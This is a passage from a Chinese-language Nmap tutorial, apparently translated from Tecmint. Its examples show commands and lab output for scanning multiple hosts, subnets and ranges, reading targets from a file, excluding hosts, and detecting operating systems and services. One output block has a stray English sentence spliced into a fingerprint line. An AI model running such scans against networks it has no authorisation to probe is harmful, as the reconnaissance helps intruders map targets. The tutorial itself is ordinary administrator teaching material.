class="keyword">open</span> port <span class="number">80</span>/tcp <span class="keyword">on</span> <span class="number">192.168</span>.<span class="number">0.101</span></span><br><span class="line">Discovered <span class="keyword">open</span> port <span class="number">8888</span>/tcp <span class="keyword">on</span> <span class="number">192.168</span>.<span class="number">0.101</span></span><br><span class="line">Discovered <span class="keyword">open</span> port <span class="number">111</span>/tcp <span class="keyword">on</span> <span class="number">192.168</span>.<span class="number">0.101</span></span><br><span class="line">Discovered <span class="keyword">open</span> port <span class="number">3306</span>/tcp <span class="keyword">on</span> <span class="number">192.168</span>.<span class="number">0.101</span></span><br><span class="line">Discovered <span class="keyword">open</span> port <span class="number">957</span>/tcp <span class="keyword">on</span> <span class="number">192.168</span>.<span class="number">0.101</span></span><br><span class="line">The SYN Stealth Scan took <span class="number">0.30</span>s <span class="keyword">to</span> scan <span class="number">1680</span> total ports.</span><br><span class="line">Host server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>) appears <span class="keyword">to</span> <span class="keyword">be</span> <span class="keyword">up</span> ... good.</span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">Not shown: <span class="number">1674</span> closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp   <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp   <span class="keyword">open</span>  http</span><br><span class="line"><span class="number">111</span>/tcp  <span class="keyword">open</span>  rpcbind</span><br><span class="line"><span class="number">957</span>/tcp  <span class="keyword">open</span>  unknown</span><br><span class="line"><span class="number">3306</span>/tcp <span class="keyword">open</span>  mysql</span><br><span class="line"><span class="number">8888</span>/tcp <span class="keyword">open</span>  <span class="keyword">sun</span>-answerbook</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">1</span> IP address (<span class="number">1</span> host <span class="keyword">up</span>) scanned in <span class="number">0.485</span> seconds</span><br><span class="line">               Raw packets sen<span class="variable">t:</span> <span class="number">1681</span> (<span class="number">73.962</span>KB) | Rcvd: <span class="number">1681</span> (<span class="number">77.322</span>KB)</span><br></pre></td></tr></table></figure>

<h3 id="3-扫描多台主机"><a href="#3-扫描多台主机" class="headerlink" title="3.扫描多台主机"></a>3.扫描多台主机</h3><p>你可以简单的在Nmap命令后加上多个IP地址或主机名来扫描多台主机。</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> <span class="number">192.168</span>.<span class="number">0.101</span> <span class="number">192.168</span>.<span class="number">0.102</span> <span class="number">192.168</span>.<span class="number">0.103</span> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">16</span>:<span class="number">06</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">Not shown: <span class="number">1674</span> closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp   <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp   <span class="keyword">open</span>  http</span><br><span class="line"><span class="number">111</span>/tcp  <span class="keyword">open</span>  rpcbind</span><br><span class="line"><span class="number">957</span>/tcp  <span class="keyword">open</span>  unknown</span><br><span class="line"><span class="number">3306</span>/tcp <span class="keyword">open</span>  mysql</span><br><span class="line"><span class="number">8888</span>/tcp <span class="keyword">open</span>  <span class="keyword">sun</span>-answerbook</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line">Nmap finished: <span class="number">3</span> IP addresses (<span class="number">1</span> host <span class="keyword">up</span>) scanned in <span class="number">0.580</span> seconds</span><br></pre></td></tr></table></figure>

<h3 id="4-扫描整个子网"><a href="#4-扫描整个子网" class="headerlink" title="4.扫描整个子网 *"></a>4.扫描整个子网 *</h3><p>你可以使用*通配符来扫描整个子网或某个范围的IP地址。</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> <span class="number">192.168</span>.<span class="number">0</span>.*</span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">16</span>:<span class="number">11</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> server1.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.100</span>):</span><br><span class="line">Not shown: <span class="number">1677</span> closed ports</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp  <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">111</span>/tcp <span class="keyword">open</span>  rpcbind</span><br><span class="line"><span class="number">851</span>/tcp <span class="keyword">open</span>  unknown</span><br><span class="line"> </span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">Not shown: <span class="number">1674</span> closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp   <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp   <span class="keyword">open</span>  http</span><br><span class="line"><span class="number">111</span>/tcp  <span class="keyword">open</span>  rpcbind</span><br><span class="line"><span class="number">957</span>/tcp  <span class="keyword">open</span>  unknown</span><br><span class="line"><span class="number">3306</span>/tcp <span class="keyword">open</span>  mysql</span><br><span class="line"><span class="number">8888</span>/tcp <span class="keyword">open</span>  <span class="keyword">sun</span>-answerbook</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">256</span> IP addresses (<span class="number">2</span> hosts <span class="keyword">up</span>) scanned in <span class="number">5.550</span> seconds</span><br><span class="line">You have <span class="keyword">new</span> mail in /var/spool/mail/root</span><br></pre></td></tr></table></figure>

<h3 id="5-使用IP地址的最后一个字节扫描多台服务器-，"><a href="#5-使用IP地址的最后一个字节扫描多台服务器-，" class="headerlink" title="5.使用IP地址的最后一个字节扫描多台服务器 ，"></a>5.使用IP地址的最后一个字节扫描多台服务器 ，</h3><p>你可以简单的指定IP地址的最后一个字节来对多个IP地址进行扫描。例如，我在下面执行中扫描了IP地址192.168.0.101，192.168.0.102和192.168.0.103。</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> <span class="number">192.168</span>.<span class="number">0.101</span>,<span class="number">102</span>,<span class="number">103</span> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">16</span>:<span class="number">09</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">Not shown: <span class="number">1674</span> closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp   <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp   <span class="keyword">open</span>  http</span><br><span class="line"><span class="number">111</span>/tcp  <span class="keyword">open</span>  rpcbind</span><br><span class="line"><span class="number">957</span>/tcp  <span class="keyword">open</span>  unknown</span><br><span class="line"><span class="number">3306</span>/tcp <span class="keyword">open</span>  mysql</span><br><span class="line"><span class="number">8888</span>/tcp <span class="keyword">open</span>  <span class="keyword">sun</span>-answerbook</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">3</span> IP addresses (<span class="number">1</span> host <span class="keyword">up</span>) scanned in <span class="number">0.552</span> seconds</span><br><span class="line">You have <span class="keyword">new</span> mail in /var/spool/mail/root</span><br></pre></td></tr></table></figure>

<h3 id="6-从一个文件中扫描主机列表-iL"><a href="#6-从一个文件中扫描主机列表-iL" class="headerlink" title="6. 从一个文件中扫描主机列表 -iL"></a>6. 从一个文件中扫描主机列表 -iL</h3><p>如果你有多台主机需要扫描且所有主机信息都写在一个文件中，那么你可以直接让nmap读取该文件来执行扫描，让我们来看看如何做到这一点。</p>
<p>创建一个名为“nmaptest.txt ”的文本文件，并定义所有你想要扫描的服务器IP地址或主机名。</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-attr">[root@server1 ~]</span># <span class="selector-tag">cat</span>  <span class="selector-tag">nmaptest</span><span class="selector-class">.txt</span> </span><br><span class="line"><span class="selector-tag">localhost</span></span><br><span class="line"><span class="selector-tag">server2</span><span class="selector-class">.tecmint</span><span class="selector-class">.com</span></span><br><span class="line">192<span class="selector-class">.168</span><span class="selector-class">.0</span><span class="selector-class">.101</span></span><br></pre></td></tr></table></figure>

<p>接下来运行带“iL”选项的nmap命令来扫描文件中列出的所有IP地址</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> -iL nmaptest.txt </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">18</span> <span class="number">10</span>:<span class="number">58</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> localhost.localdomain (<span class="number">127.0</span>.<span class="number">0.1</span>):</span><br><span class="line">Not shown: <span class="number">1675</span> closed ports</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp  <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">25</span>/tcp  <span class="keyword">open</span>  smtp</span><br><span class="line"><span class="number">111</span>/tcp <span class="keyword">open</span>  rpcbind</span><br><span class="line"><span class="number">631</span>/tcp <span class="keyword">open</span>  ipp</span><br><span class="line"><span class="number">857</span>/tcp <span class="keyword">open</span>  unknown</span><br><span class="line"> </span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">Not shown: <span class="number">1674</span> closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp   <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp   <span class="keyword">open</span>  http</span><br><span class="line"><span class="number">111</span>/tcp  <span class="keyword">open</span>  rpcbind</span><br><span class="line"><span class="number">958</span>/tcp  <span class="keyword">open</span>  unknown</span><br><span class="line"><span class="number">3306</span>/tcp <span class="keyword">open</span>  mysql</span><br><span class="line"><span class="number">8888</span>/tcp <span class="keyword">open</span>  <span class="keyword">sun</span>-answerbook</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems) </span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">Not shown: <span class="number">1674</span> closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp   <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp   <span class="keyword">open</span>  http</span><br><span class="line"><span class="number">111</span>/tcp  <span class="keyword">open</span>  rpcbind</span><br><span class="line"><span class="number">958</span>/tcp  <span class="keyword">open</span>  unknown</span><br><span class="line"><span class="number">3306</span>/tcp <span class="keyword">open</span>  mysql</span><br><span class="line"><span class="number">8888</span>/tcp <span class="keyword">open</span>  <span class="keyword">sun</span>-answerbook</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems) </span><br><span class="line">Nmap finished: <span class="number">3</span> IP addresses (<span class="number">3</span> hosts <span class="keyword">up</span>) scanned in <span class="number">2.047</span> seconds</span><br></pre></td></tr></table></figure>

<h3 id="7-扫描一个IP地址范围"><a href="#7-扫描一个IP地址范围" class="headerlink" title="7.扫描一个IP地址范围 -"></a>7.扫描一个IP地址范围 -</h3><p>你可以在nmap执行扫描时指定IP范围。</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> <span class="number">192.168</span>.<span class="number">0.101</span>-<span class="number">110</span> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">16</span>:<span class="number">09</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">Not shown: <span class="number">1674</span> closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp   <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp   <span class="keyword">open</span>  http</span><br><span class="line"><span class="number">111</span>/tcp  <span class="keyword">open</span>  rpcbind</span><br><span class="line"><span class="number">957</span>/tcp  <span class="keyword">open</span>  unknown</span><br><span class="line"><span class="number">3306</span>/tcp <span class="keyword">open</span>  mysql</span><br><span class="line"><span class="number">8888</span>/tcp <span class="keyword">open</span>  <span class="keyword">sun</span>-answerbook</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems) </span><br><span class="line">Nmap finished: <span class="number">10</span> IP addresses (<span class="number">1</span> host <span class="keyword">up</span>) scanned in <span class="number">0.542</span> seconds</span><br></pre></td></tr></table></figure>

<h3 id="8-排除一些远程主机后再扫描–exclude"><a href="#8-排除一些远程主机后再扫描–exclude" class="headerlink" title="8.排除一些远程主机后再扫描–exclude"></a>8.排除一些远程主机后再扫描–exclude</h3><p>在执行全网扫描或用通配符扫描时你可以使用“–exclude”选项来排除某些你不想要扫描的主机。</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> <span class="number">192.168</span>.<span class="number">0</span>.* --exclude <span class="number">192.168</span>.<span class="number">0.100</span></span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">16</span>:<span class="number">16</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">Not shown: <span class="number">1674</span> closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp   <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp   <span class="keyword">open</span>  http</span><br><span class="line"><span class="number">111</span>/tcp  <span class="keyword">open</span>  rpcbind</span><br><span class="line"><span class="number">957</span>/tcp  <span class="keyword">open</span>  unknown</span><br><span class="line"><span class="number">3306</span>/tcp <span class="keyword">open</span>  mysql</span><br><span class="line"><span class="number">8888</span>/tcp <span class="keyword">open</span>  <span class="keyword">sun</span>-answerbook</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">255</span> IP addresses (<span class="number">1</span> host <span class="keyword">up</span>) scanned in <span class="number">5.313</span> seconds</span><br><span class="line">You have <span class="keyword">new</span> mail in /var/spool/mail/root</span><br></pre></td></tr></table></figure>

<h3 id="9-扫描操作系统信息和路由跟踪-A"><a href="#9-扫描操作系统信息和路由跟踪-A" class="headerlink" title="9.扫描操作系统信息和路由跟踪-A"></a>9.扫描操作系统信息和路由跟踪-A</h3><p>使用Nmap，你可以检测远程主机上运行的操作系统和版本。为了启用操作系统和版本检测，脚本扫描和路由跟踪功能，我们可以使用NMAP的“<strong>-A</strong>“选项。</p>
<figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# nmap -<span class="type">A</span> <span class="number">192.168</span><span class="number">.0</span><span class="number">.101</span></span><br><span class="line"> </span><br><span class="line"><span class="type">Starting</span> <span class="type">Nmap</span> <span class="number">4.11</span> ( http://www.insecure.org/nmap/ ) at <span class="number">2013</span><span class="number">-11</span><span class="number">-11</span> <span class="number">16</span>:<span class="number">25</span> <span class="type">EST</span></span><br><span class="line"><span class="type">Interesting</span> ports on server2.tecmint.com (192.168.0.101):</span><br><span class="line">Not shown: 1674 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 4.3 (protocol 2.0)</span><br><span class="line">80/tcp   open  http    Apache httpd 2.2.3 ((<span class="type">CentOS</span>))</span><br><span class="line">111/tcp  open  rpcbind  2 (rpc #100000)</span><br><span class="line">957/tcp  open  status   1 (rpc #100024)</span><br><span class="line">3306/tcp open  mysql   MySQL (unauthorized)</span><br><span class="line">8888/tcp open  http    lighttpd 1.4.32</span><br><span class="line">MAC Address: 08:00:27:D9:8E:D7 (<span class="type">Cadmus</span> <span class="type">Computer</span> <span class="type">Systems</span>)</span><br><span class="line">No exact OS matches for host (<span class="type">If</span> you know what <span class="type">OS</span> is running on it, see http://www.insecure.org/cgi-bin/nmap-submit.cgi).</span><br><span class="line">TCP/IP fingerprint:</span><br><span class="line">SInfo(<span class="type">V</span>=4.11%<span class="type">P</span>=i686-redhat-linux-gnu%<span class="type">D</span>=11/11%<span class="type">Tm</span>=52814B66%<span class="type">O</span>=22%<span class="type">C</span>=1%<span class="type">M</span>=080027)</span><br><span class="line">TSeq(<span class="type">Class</span>=<span class="type">TR</span>%<span class="type">IPID</span>=<span class="type">Z</span>%<span class="type">TS</span>=1000HZ)</span><br><span class="line">T1(<span class="type">Resp</span>=<span class="type">Y</span>%<span class="type">DF</span>=<span class="type">Y</span>%<span class="type">W</span>=16A0%<span class="type">ACK</span>=<span class="type">S</span>++%<span class="type">Flags</span>=<span class="type">AS</span>%<span class="type">Ops</span>=<span class="type">MNNTNW</span>)</span><br><span class="line">T2(<span class="type">Resp</span>=<span class="type">N</span>)</span><br><span class="line">T3(<span class="type">Resp</span>=<span class="type">Y</span>%<span class="type">DF</span>=<span class="type">Y</span>%<span class="type">W</span>=16A0%<span class="type">ACK</span>=<span class="type">S</span>++%<span class="type">Flags</span>=<span class="type">AS</span>%<span class="type">Ops</span>=<span class="type">MNNTNW</span>)</span><br><span class="line">T4(<span class="type">Resp</span>=<span class="type">Y</span>%<span class="type">DF</span>=<span class="type">Y</span>%<span class="type">W</span>=0%<span class="type">ACK</span>=<span class="type">O</span>%<span class="type">Flags</span>=<span class="type">R</span>%<span class="type">Ops</span>=)</span><br><span class="line">T5(<span class="type">Resp</span>=<span class="type">Y</span>%<span class="type">DF</span>=<span class="type">Y</span>%<span class="type">W</span>=0%<span class="type">ACK</span>=<span class="type">S</span>++%<span class="type">Flags</span>=<span class="type">AR</span>%<span class="type">Ops</span>=)</span><br><span class="line">T6(<span class="type">Resp</span>=<span class="type">Y</span>%<span class="type">DF</span>=<span class="type">Y</span>%<span class="type">W</span>=0%<span class="type">ACK</span>=<span class="type">O</span>%<span class="type">Flags</span>=<span class="type">R</span>%<span class="type">Ops</span>=)</span><br><span class="line">T7(<span class="type">Resp</span>=<span class="type">Y</span>%<span class="type">DF</span>=<span class="type">Y</span>%<span class="type">W</span>=0%<span class="type">ACK</span>=<span class="type">S</span>++%<span class="type">Flags</span>=<span class="type">AR</span>%<span class="type">Ops</span>=)</span><br><span class="line">PU(<span class="type">Resp</span>=<span class="type">Y</span>%<span class="type">DF</span>=<span class="type">N</span>%<span class="type">TOS</span>=<span class="type">C0</span>%<span class="type">IPLEN</span>=164%<span class="type">RIPTL</span>=148%<span class="type">RID</span>=<span class="type">E</span>%<span class="type">RIPCK</span>=<span class="type">E</span>%<span class="type">UCK</span>=<span class="type">E</span>%<span class="type">ULEN</span>=134%<span class="type">DAT</span>=<span class="type">E</span>)</span><br><span class="line"> </span><br><span class="line">Uptime 0.169 days (since <span class="type">Mon</span> <span class="type">Nov</span> 11 12:22:15 2013)</span><br><span class="line"> </span><br><span class="line">Nmap finished: 1 IP address (1 host up) scanned in 22.271 seconds</span><br></pre></td></tr></table></figure>

<p>从上面的输出你可以看到，Nmap显示出了远程主机<strong>操作系统的TCP</strong> / <strong>IP</strong>协议指纹，并且更加具体的显示出远程主机上的端口和服务。</p>
<h3 id="10-启用Nmap的操作系统探测功能-O"><a href="#10-启用Nmap的操作系统探测功能-O" class="headerlink" title="10.启用Nmap的操作系统探测功能-O"></a>10.启用Nmap的操作系统探测功能-O</h3><p>使用选项“<strong>-O</strong>”和“<strong>-osscan-guess</strong>”也帮助探测操作系统信息。</p>
<figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# nmap -<span class="type">O</span> server2.tecmint.com</span><br><span class="line"> </span><br><span class="line"><span class="type">Starting</span> <span class="type">Nmap</span> <span class="number">4.11</span> ( http://www.insecure.org/nmap/ ) at <span class="number">2013</span><span class="number">-11</span><span class="number">-11</span> <span class="number">17</span>:<span class="number">40</span> <span class="type">EST</span></span><br><span class="line"><span class="type">Interesting</span> ports on server2.tecmint.com (192.168.0.101):</span><br><span class="line">Not shown: 1674 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">111/tcp  open  rpcbind</span><br><span class="line">957/tcp  open  unknown</span><br><span class="line">3306/tcp open  mysql</span><br><span class="line">8888/tcp open  sun-answerbook</span><br><span class="line">MAC Address: 08:00:27:D9:8E:D7 (<span class="type">Cadmus</span> <span class="type">Computer</span> <span class="type">Systems</span>)</span><br><span class="line">No exact OS matches for host (<span class="type">If</span> you know what <span class="type">OS</span> is running on it, see http://www.insecure.org/cgi-bin/nmap-submit.cgi).</span><br><span class="line">TCP/IP fingerprint:</span><br><span class="line">SInfo(<span class="type">V</span>=4.11%<span class="type">P</span>=i686-redhat-linux-gnu%<span class="type">D</span>=11/11%<span class="type">Tm</span>=52815CF4%<span class="type">O</span>=22%<span class="type">C</span>=1%<span class="type">M</span>=080027)</span><br><span class="line">TSeq(<span class="type">Class</span>=<span class="type">TR</span>%<span class="type">IPID</span>=<span class="type">Z</span>%<span class="type">TS</span>=1000HZ)</span><br><span class="line">T1(<span class="type">Resp</span>=<span class="type">Y</span>%<span class="type">DF</span>=<span class="type">Y</span>%<span class="type">W</span>=16A0%<span class="type">ACK</span>=<span class="type">S</span>++%<span class="type">Flags</span>=<span class="type">AS</span>%<span class="type">Ops</span>=<span class="type">MNNTNW</span>)</span><br><span class="line">T2(<span class="type">Resp</span>=<span class="type">N</span>)</span><br><span class="line">T3(<span class="type">Resp</span>=<span class="type">Y</span>%<span class="type">DF</span>=<span class="type">Y</span>%<span class="type">W</span>=16A0%<span class="type">ACK</span>=<span class="type">S</span>++%<span class="type">Flags</span>=<span class="type">AS</span>%<span class="type">Ops</span>=<span class="type">MNNTNW</span>)</span><br><span class="line">T4(<span class="type">Resp</span>=<span class="type">Y</span>%<span class="type">DF</span>=<span class="type">Y</span>%<span class="type">W</span>=0%<span class="type">ACK</span>=<span class="type">O</span>%<span class="type">Flags</span>=<span class="type">Option</span> -<span class="type">O</span> and -osscan-guess also helps to discover <span class="type">OS</span></span><br><span class="line"><span class="type">R</span>%<span class="type">Ops</span>=)</span><br><span class="line">T5(<span class="type">Resp</span>=<span class="type">Y</span>%<span class="type">DF</span>=<span class="type">Y</span>%<span class="type">W</span>=0%<span class="type">ACK</span>=<span class="type">S</span>++%<span class="type">Flags</span>=<span class="type">AR</span>%<span class="type">Ops</span>=)</span><br><span class="line">T6(<span class="type">Resp</span>=<span class="type">Y</span>%<span class="type">DF</span>=<span class="type">Y</span>%<span class="type">W</span>=0%<span class="type">ACK</span>=<span class="type">O</span>%<span class="type">Flags</span>=<span class="type">R</span>%<span class="type">Ops</span>=)</span><br><span class="line">T7(<span class="type">Resp</span>=<span class="type">Y</span>%<span class="type">DF</span>=<span class="type">Y</span>%<span class="type">W</span>=0%<span class="type">ACK</span>=<span class="type">S</span>++%<span class="type">Flags</span>=<span class="type">AR</span>%<span class="type">Ops</span>=)</span><br><span class="line">PU(<span class="type">Resp</span>=<span class="type">Y</span>%<span class="type">DF</span>=<span class="type">N</span>%<span class="type">TOS</span>=<span class="type">C0</span>%<span class="type">IPLEN</span>=164%<span class="type">RIPTL</span>=148%<span 